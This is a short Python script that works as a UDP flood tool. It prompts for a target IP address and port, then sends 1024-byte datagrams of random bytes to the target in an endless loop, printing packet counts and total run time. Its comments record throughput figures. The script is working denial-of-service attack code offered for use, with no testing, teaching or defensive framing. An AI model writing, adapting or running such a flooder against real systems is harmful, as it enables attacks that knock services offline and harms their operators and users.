# as we are opening sockets, need the module
import socket
import random

# time our script
import time

# gather info
ip   = input('   IP to Flood: ')
port = input('Port to Attack: ')
port = int(port)

# start time
startTime = time.time()

#   .67s = 3999 packets
# 13.15s = 79994 packets
count = 0
try:
   while True:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      bytes = random._urandom(1024)
      s.sendto(bytes,(ip,port))
      count = count +1
      if count % 1000 == 0:
         print('.',flush=True,end='')
         if count % 100000 == 0:
            print('.'+" (100,000 Packets)",flush=True)

except KeyboardInterrupt:
   pass

# ok, give us a final time report
runtime = float("%0.2f" % (time.time() - startTime))
count = str(count)
print("Run Time: ", runtime, "seconds and " + count + "packets")